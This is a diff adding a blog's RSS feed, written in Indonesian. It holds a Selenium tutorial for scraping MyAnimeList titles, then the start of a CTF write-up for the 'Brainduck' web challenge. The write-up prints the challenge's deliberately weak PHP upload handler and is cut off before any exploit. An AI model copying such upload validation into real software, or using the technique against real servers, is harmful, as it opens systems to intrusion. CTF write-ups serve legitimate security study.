@@ -1,0 +1,1173 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Infinite Overflow</title>
+        <link>/posts/</link>
+        <description>Recent content in Posts on Infinite Overflow</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>cacadosman</copyright>
+        <lastBuildDate>Mon, 07 Oct 2019 17:06:28 +0000</lastBuildDate>
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Tutorial Scraping dengan Python Selenium</title>
+            <link>/tutorial-scraping-dengan-python-selenium/</link>
+            <pubDate>Mon, 07 Oct 2019 17:06:28 +0000</pubDate>
+            
+            <guid>/tutorial-scraping-dengan-python-selenium/</guid>
+            <description>Halo semua, sekarang kita akan belajar cara scrapping menggunakan selenium dengan bahasa pemrograman python.
+Artikel ini dibuat karena banyak yang minta ajarin scrapping, akhirnya daripada website gak ada isinya, lebih baik bikin konten tentang scrapping.
+Sebenarnya saya juga masih sangat newbie menggunakan selenium, hanya saja waktu itu pernah ikut training b**b** f***** tentang UI Testing menggunakan Serenity BDD (tapi pakai java sih wkwkwk). Jadi mohon maaf apabila masih terdapat banyak kesalahan 🙂</description>
+            <content type="html"><![CDATA[<p>Halo semua, sekarang kita akan belajar cara scrapping menggunakan selenium dengan bahasa pemrograman python.<br>
+Artikel ini dibuat karena banyak yang minta ajarin scrapping, akhirnya daripada website gak ada isinya, lebih baik bikin konten tentang scrapping.</p>
+<p>Sebenarnya saya juga masih sangat newbie menggunakan selenium, hanya saja waktu itu pernah ikut training b**b** f***** tentang UI Testing menggunakan Serenity BDD (tapi pakai java sih wkwkwk). Jadi mohon maaf apabila masih terdapat banyak kesalahan 🙂</p>
+<!-- raw HTML omitted -->
+<p>Apa itu selenium?<br>
+Secara mudahnya selenium itu merupakan tools yang sering digunakan untuk melakukan test secara otomatisasi dengan menggunakan perantara web browser.</p>
+<p>Biasanya selenium digunakan untuk melakukan UI Testing berdasarkan features atau skenario yang sudah didefinisikan.<br>
+Untuk saat ini kita tidak akan melakukan testing, tetapi kita akan melakukan scrapping untuk mendapatkan data pada website tertentu.</p>
+<p><strong>Requirements:</strong></p>
+<ul>
+<li>Siapkan laptop/komputer dan koneksi internet</li>
+<li>Google Chrome</li>
+<li>Download Chromedriver.<br>
+Link download: <a href="https://chromedriver.chromium.org/downloads">https://chromedriver.chromium.org/downloads</a> (Sesuaikan dengan versi chrome teman-teman)</li>
+<li>Python 3.xx dan jangan lupa modul pip nya</li>
+<li>Visual Studio Code atau sejenisnya</li>
+<li>Extension ChroPath pada chrome.<br>
+Link download: <a href="https://chrome.google.com/webstore/detail/chropath/ljngjbnaijcbncmcnjfhigebomdlkcjo?hl=en">https://chrome.google.com/webstore/detail/chropath/ljngjbnaijcbncmcnjfhigebomdlkcjo?hl=en</a></li>
+<li>Secangkir kopi.</li>
+</ul>
+<p>Pertama, kita copy <strong>chromedriver.exe</strong> yang telah kita download ke <strong>C:\Windows</strong> (bagi pengguna jendela).<br>
+Untuk pengguna linux, kita bisa pindahkan <strong>chromedriver</strong> ke <strong>/usr/bin</strong></p>
+<p>Setelah itu, install python 3.xx dan pastikan command pip bisa dijalankan.</p>
+<p>Lalu ketikkan perintah berikut pada cmd/terminal:</p>
+<p><code>pip install selenium</code></p>
+<p>Kemudian saatnya kita ngoding, buka VSCode atau text editor favorit teman-teman 🙂</p>
+<p>Apa website yang ingin kita scrapping?<br>
+Kita akan melakukan scrapping pada website MyAnimeList sebagai contoh.<br>
+<a href="https://myanimelist.net/anime/season">https://myanimelist.net/anime/season</a></p>
+<p>Tampilan antarmuka website:
+<img src="/mal1.png" alt="MAL"></p>
+<p>Jadi rencananya, kita akan mengambil data semua judul anime pada season sekarang (Fall 2019) dan season selanjutnya (Winter 2020). Oleh karena itu, hal pertama yang akan kita lakukan adalah membuat user story atau mudahnya skenario untuk membantu kita dalam melakukan koding.</p>
+<p>Story:</p>
+<ul>
+<li>Pertama, kita akan membuka website MyAnimeList di halaman season sekarang</li>
+<li>Kedua, kita akan mengambil semua data judul anime di halaman fall 2019 yang tampil</li>
+<li>Ketiga, kita akan menekan tombol Winter 2020</li>
+<li>Keempat, kita akan mengambil lagi semua data judul anime di halaman winter 2020 yang tampil.</li>
+<li>Kelima, simpan kedalam file dengan format JSON</li>
+</ul>
+<p>Namun, permasalahannya adalah saat membuka website MyAnimeList untuk pertama kalinya, kita akan melihat popup privacy policy yang akan mengganggu proses scrapping kita.<!-- raw HTML omitted --></p>
+<p><img src="/mal2.png" alt="MAL2"></p>
+<p>Sehingga setelah kita berhasil membuka websitenya, kita akan menekan tombol OK terlebih dahulu pada popup Privacy Policy. Oleh karena itu, kita akan merubah lagi user story yang telah kita buat.</p>
+<p>Story:</p>
+<ul>
+<li>Pertama, kita akan membuka website MyAnimeList di halaman season sekarang</li>
+<li>Kedua, tunggu sampai popup Privacy Policy muncul dan tekan tombol OK</li>
+<li>Ketiga , kita akan mengambil semua data judul anime di halaman fall 2019 yang tampil</li>
+<li>Keempat , kita akan menekan tombol Winter 2020</li>
+<li>Kelima, kita akan mengambil lagi semua data judul anime di halaman winter 2020 yang tampil.</li>
+<li>Keenam, simpan kedalam file dengan format JSON</li>
+</ul>
+<p>Selanjutnya, kita buat tiga buah file dengan nama:</p>
+<ul>
+<li>story.py</li>
+<li>steps.py</li>
+<li>pages.py</li>
+</ul>
+<p>Buka story.py lalu ketikkan dengan kode berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> steps <span style="color:#f92672">import</span> MyAnimeListStep
+
+myanimelist_step <span style="color:#f92672">=</span> MyAnimeListStep()
+
+<span style="color:#75715e"># the user is on the MyAnimeList current season page</span>
+myanimelist_step<span style="color:#f92672">.</span>user_open_myanimelist_website()
+<span style="color:#75715e"># the user should on privacy policy popup then click OK button</span>
+myanimelist_step<span style="color:#f92672">.</span>user_should_on_privacy_policy_popup_then_click_ok_button()
+<span style="color:#75715e"># the user is getting all anime titles on fall 2019 page</span>
+myanimelist_step<span style="color:#f92672">.</span>user_get_all_anime_titles_on_fall_2019_page()
+<span style="color:#75715e"># the user should see winter 2020 button and click on it</span>
+myanimelist_step<span style="color:#f92672">.</span>user_should_see_winter_2020_button_and_click_it()
+<span style="color:#75715e"># the user is getting all anime titles on winter 2020 page</span>
+myanimelist_step<span style="color:#f92672">.</span>user_get_all_anime_titles_on_winter_2020_page()
+<span style="color:#75715e"># the user is saving all anime titles to json file</span>
+myanimelist_step<span style="color:#f92672">.</span>user_save_all_anime_titles_to_json_file()
+
+myanimelist_step<span style="color:#f92672">.</span>end()
+</code></pre></div><p>File story.py merupakan file utama untuk menuliskan user story atau skenario yang sudah didefinisikan agar kita mudah mengetahui langkah-langkah apa saja yang harus dilakukan saat melakukan scrapping.</p>
+<p>Lalu, kita akan membuat file steps.py yang berisikan kode berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pages <span style="color:#f92672">import</span> MyAnimeListPage
+<span style="color:#f92672">import</span> json
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListStep</span>:
+    <span style="color:#66d9ef">def</span> __init__(self):
+        self<span style="color:#f92672">.</span>__base_url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://myanimelist.net/anime/season</span><span style="color:#e6db74">&#39;</span>
+        self<span style="color:#f92672">.</span>__myanimelist_page <span style="color:#f92672">=</span> MyAnimeListPage(self<span style="color:#f92672">.</span>__base_url)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_open_myanimelist_website</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_should_on_privacy_policy_popup_then_click_ok_button</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_get_all_anime_titles_on_fall_2019_page</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_should_see_winter_2020_button_and_click_it</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_get_all_anime_titles_on_winter_2020_page</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_save_all_anime_titles_to_json_file</span>(self):
+        <span style="color:#66d9ef">pass</span>
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">end</span>(self):
+        <span style="color:#66d9ef">pass</span>
+</code></pre></div><p>File steps.py berfungsi sebagai level abstraksi antara kode yang berurusan langsung dengan aplikasi web dan user story. Mudahnya, agar kode lebih readable dan mudah untuk dimaintain sehingga tidak tercampur aduk.</p>
+<p>Untuk sementara, setiap method pada steps.py kita beri <em>pass</em> karena belum memiliki impelementasi.<br>
+Oleh karena itu, selanjutnya kita akan membuat file pages.py yang berisikan kode berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
+<span style="color:#f92672">from</span> selenium.webdriver.common.by <span style="color:#f92672">import</span> By
+<span style="color:#f92672">from</span> selenium.webdriver.support.ui <span style="color:#f92672">import</span> WebDriverWait
+<span style="color:#f92672">from</span> selenium.webdriver.support <span style="color:#f92672">import</span> expected_conditions <span style="color:#66d9ef">as</span> EC
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListPage</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, url):
+        self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
+        self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+        self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
+</code></pre></div><p>Pada kode diatas, kita melakukan inisiasi url dan chromedriver yang akan selalu digunakan.<br>
+Lalu kita membuat method open untuk membuka url pada browser.</p>
+<p>Setelah itu, kita kembali ke steps.py dan tambahkan implementasi pada method user_open_myanimelist_website</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_open_myanimelist_website</span>(self):
+    self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>open()
+</code></pre></div><p>Lalu kita buka pages.py untuk membuat method yang berfungsi menunggu munculnya popup dan menekan tombol OK.<br>
+Sebelum itu, kita akan menggunakan extension ChroPath untuk mencari nilai dari XPath nya.</p>
+<p>Caranya buka website MyAnimeList dan lakukan inspect element. Lalu tunggu sampai popup Privacy Policy muncul dan inspect tombol OK nya.</p>
+<p><img src="/mal3.png" alt="MAL3"></p>
+<p>Lalu kita jalankan extension ChroPath nya seperti berikut</p>
+<p><img src="/mal4.png" alt="MAL4"></p>
+<p>Lalu kita copy Rel XPath nya untuk kemudian kita pastekan pada kode.</p>
+<p><img src="/mal5.png" alt="MAL5"></p>
+<p>Setelah kita mendapatkan Rel XPath, buka kembali pages.py dan edit seperti berikut</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListPage</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, url):
+        self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
+        self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
+
+        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//button[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+        self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_privacy_policy</span>(self):
+        <span style="color:#66d9ef">return</span> WebDriverWait(self<span style="color:#f92672">.</span>__driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(
+               EC<span style="color:#f92672">.</span>presence_of_element_located(
+               (By<span style="color:#f92672">.</span>XPATH, self<span style="color:#f92672">.</span>__button_privacy_policy)))<span style="color:#f92672">.</span>click()
+</code></pre></div><p>Pada file pages.py kita tambahkan Rel XPath pada variabel self.__button_privacy_policy<br>
+Lalu, pada method click_button_privacy_policy, kita gunakan WebDriverWait until dan EC.presence_of_element_located untuk memastikan element yang ingin kita klik berdasarkan XPath tersebut sudah tersedia dengan limit waktu sebanyak 10 detik.</p>
+<p>Karena nantinya WebDriverWait ini akan selalu kita gunakan, maka kita akan buat method baru agar kita dapat dengan mudah me-reusable WebDriverWait.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
+<span style="color:#f92672">from</span> selenium.webdriver.common.by <span style="color:#f92672">import</span> By
+<span style="color:#f92672">from</span> selenium.webdriver.support.ui <span style="color:#f92672">import</span> WebDriverWait
+<span style="color:#f92672">from</span> selenium.webdriver.support <span style="color:#f92672">import</span> expected_conditions <span style="color:#66d9ef">as</span> EC
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListPage</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, url):
+        self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
+        self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
+
+        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//button[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__wait_until</span>(self, ec, by, value):
+        <span style="color:#66d9ef">return</span> WebDriverWait(self<span style="color:#f92672">.</span>__driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec((by, value)))
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+        self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_privacy_policy</span>(self):
+        self<span style="color:#f92672">.</span>__wait_until(
+            EC<span style="color:#f92672">.</span>presence_of_element_located,
+            By<span style="color:#f92672">.</span>XPATH, self<span style="color:#f92672">.</span>__button_privacy_policy
+        )<span style="color:#f92672">.</span>click()
+</code></pre></div><p>Pada file pages.py kita menambahkan method __wait_until yang nantinya dapat kita reuseable di method lainnya.</p>
+<p>Setelah itu, kita kembali ke steps.py untuk menambahkan implementasi pada method user_should_on_privacy_policy_popup_then_click_ok_button</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_should_on_privacy_policy_popup_then_click_ok_button</span>(self):
+    self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>click_button_privacy_policy()
+</code></pre></div><p>Sehingga untuk sisanya, kita akan mengulangi tahapan diatas menggunakan ChroPath.<br>
+Maka hasil akhir dari pages.py adalah seperti berikut</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
+<span style="color:#f92672">from</span> selenium.webdriver.common.by <span style="color:#f92672">import</span> By
+<span style="color:#f92672">from</span> selenium.webdriver.support.ui <span style="color:#f92672">import</span> WebDriverWait
+<span style="color:#f92672">from</span> selenium.webdriver.support <span style="color:#f92672">import</span> expected_conditions <span style="color:#66d9ef">as</span> EC
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListPage</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, url):
+        self<span style="color:#f92672">.</span>__url <span style="color:#f92672">=</span> url
+        self<span style="color:#f92672">.</span>__driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome()
+
+        self<span style="color:#f92672">.</span>__button_privacy_policy <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//button[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">OK</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+        self<span style="color:#f92672">.</span>__text_title <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//a[@class=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">link-title</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">]</span><span style="color:#e6db74">&#34;</span>
+        self<span style="color:#f92672">.</span>__button_winter2020 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">//a[contains(text(),</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Winter 2020</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)]</span><span style="color:#e6db74">&#34;</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__wait_until</span>(self, ec, by, value):
+        <span style="color:#66d9ef">return</span> WebDriverWait(self<span style="color:#f92672">.</span>__driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec((by, value)))
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">open</span>(self, path <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>):
+        self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>get(self<span style="color:#f92672">.</span>__url <span style="color:#f92672">+</span> path)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_privacy_policy</span>(self):
+        self<span style="color:#f92672">.</span>__wait_until(
+            EC<span style="color:#f92672">.</span>presence_of_element_located,
+            By<span style="color:#f92672">.</span>XPATH, self<span style="color:#f92672">.</span>__button_privacy_policy
+        )<span style="color:#f92672">.</span>click()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_all_title</span>(self):
+        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>__wait_until(
+            EC<span style="color:#f92672">.</span>presence_of_all_elements_located, 
+            By<span style="color:#f92672">.</span>XPATH, self<span style="color:#f92672">.</span>__text_title
+        )
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">click_button_winter2020</span>(self):
+        self<span style="color:#f92672">.</span>__wait_until(
+            EC<span style="color:#f92672">.</span>presence_of_element_located,
+            By<span style="color:#f92672">.</span>XPATH, self<span style="color:#f92672">.</span>__button_winter2020
+        )<span style="color:#f92672">.</span>click()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">close</span>(self):
+        self<span style="color:#f92672">.</span>__driver<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Lalu untuk hasil akhir steps.py adalah seperti berikut</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pages <span style="color:#f92672">import</span> MyAnimeListPage
+<span style="color:#f92672">import</span> json
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyAnimeListStep</span>:
+    <span style="color:#66d9ef">def</span> __init__(self):
+        self<span style="color:#f92672">.</span>__base_url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://myanimelist.net/anime/season</span><span style="color:#e6db74">&#39;</span>
+        self<span style="color:#f92672">.</span>__myanimelist_page <span style="color:#f92672">=</span> MyAnimeListPage(self<span style="color:#f92672">.</span>__base_url)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_open_myanimelist_website</span>(self):
+        self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>open()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_should_on_privacy_policy_popup_then_click_ok_button</span>(self):
+        self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>click_button_privacy_policy()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_get_all_anime_titles_on_fall_2019_page</span>(self):
+        web_element_titles <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>get_all_title()
+        self<span style="color:#f92672">.</span>__text_titles_fall2019 <span style="color:#f92672">=</span> [title<span style="color:#f92672">.</span>text <span style="color:#66d9ef">for</span> title <span style="color:#f92672">in</span> web_element_titles]
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_should_see_winter_2020_button_and_click_it</span>(self):
+        self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>click_button_winter2020()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_get_all_anime_titles_on_winter_2020_page</span>(self):
+        web_element_titles <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>get_all_title()
+        self<span style="color:#f92672">.</span>__text_titles_winter2020 <span style="color:#f92672">=</span> [title<span style="color:#f92672">.</span>text <span style="color:#66d9ef">for</span> title <span style="color:#f92672">in</span> web_element_titles]
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">user_save_all_anime_titles_to_json_file</span>(self):
+        data <span style="color:#f92672">=</span> {
+            <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">fall-2019</span><span style="color:#e6db74">&#39;</span>: self<span style="color:#f92672">.</span>__text_titles_fall2019,
+            <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">winter-2020</span><span style="color:#e6db74">&#39;</span>: self<span style="color:#f92672">.</span>__text_titles_winter2020
+        }
+
+        f <span style="color:#f92672">=</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">anime_titles.json</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>)
+        f<span style="color:#f92672">.</span>write(json<span style="color:#f92672">.</span>dumps(data, indent <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>))
+        f<span style="color:#f92672">.</span>close()
+    
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">end</span>(self):
+        self<span style="color:#f92672">.</span>__myanimelist_page<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Lalu jalankan programnya dengan menggunakan perintah</p>
+<p><code>python story.py</code></p>
+<p>Maka kita akan mendapatkan hasilnya dalam format JSON.</p>
+<p><img src="/mal6.png" alt="MAL6"></p>
+<p>Sebelumnya saya mohon maaf karena tidak menjelaskan semua kode yang dikarenakan akan sangat panjang dan menyita waktu karena ini berupa artikel bukan video.<br>
+Saran saya adalah untuk mempelajarinya dari dokumentasi resminya: <a href="https://selenium-python.readthedocs.io/index.html">https://selenium-python.readthedocs.io/index.html</a></p>
+<p>Tips paling mudah untuk belajar selenium dari awal adalah mencoba Getting Started dari dokumentasi resmi: <a href="https://selenium-python.readthedocs.io/getting-started.html">https://selenium-python.readthedocs.io/getting-started.html</a></p>
+<p>Demikianlah artikel tentang tutorial scrapping dengan python selenium. Apabila masih ada pertanyaan bisa langsung tulis di kolom komentar atau mengkontak saya.</p>
+<p>Apabila terdapat kesalahan baik yang disengaja dan tidak, saya mohon maaf dan tolong untuk dikoreksi.</p>
+<p>Semoga artikel ini dapat bermanfaat.<br>
+Terima kasih.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Writeup CTF Brainduck Final Arkavidia 5.0</title>
+            <link>/writeup-ctf-brainduck-final-arkavidia-5-0/</link>
+            <pubDate>Sun, 10 Feb 2019 02:46:54 +0000</pubDate>
+            
+            <guid>/writeup-ctf-brainduck-final-arkavidia-5-0/</guid>
+            <description>Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.
+Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.
+Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:
+&amp;lt;?php if (isset($_GET[&amp;#34;debug&amp;#34;])) { highlight_file(__FILE__); die(); } function processUpload() { if (!is_uploaded_file($_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;])) { throw new Exception(&amp;#39;Bukan file terupload&amp;#39;); } if ($_FILES[&amp;#39;file&amp;#39;][&amp;#39;size&amp;#39;] &amp;gt; 500) { throw new Exception(&amp;#39;Ukuran file tidak boleh melebihi 500 bytes&amp;#39;); } // harusnya cuma boleh &amp;gt;&amp;lt;+-[].</description>
+            <content type="html"><![CDATA[<p>Terdapat sebuah web yang memiliki fitur untuk menginterpretasikan esolang brainfuck.</p>
+<p><img src="/wp-content/2019/02/bd.png" alt=""></p>
+<p>Jadi kira hanya perlu mengupload file yang berisikan bahasa brainfuck untuk diinterpretasikan dan juga dapat mendownload file yang telah kita upload.</p>
+<p>Saat kita lakukan inspect element/view source terdapat hint ?debug=V untuk dapat melihat source code php nya. Lalu kita akan mendapat source seperti berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;debug&#34;</span>])) {
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">die</span>();
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">processUpload</span>() {
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>])) {
+      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Bukan file terupload&#39;</span>);
+    }
+
+    <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">500</span>) {
+      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Ukuran file tidak boleh melebihi 500 bytes&#39;</span>);
+    }
+
+    <span style="color:#75715e">// harusnya cuma boleh &gt;&lt;+-[].,
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// tapi ya sudah lah ¯\_(ツ)_/¯
+</span><span style="color:#75715e"></span>    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">ctype_punct</span>(<span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/\s+/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $content))) {
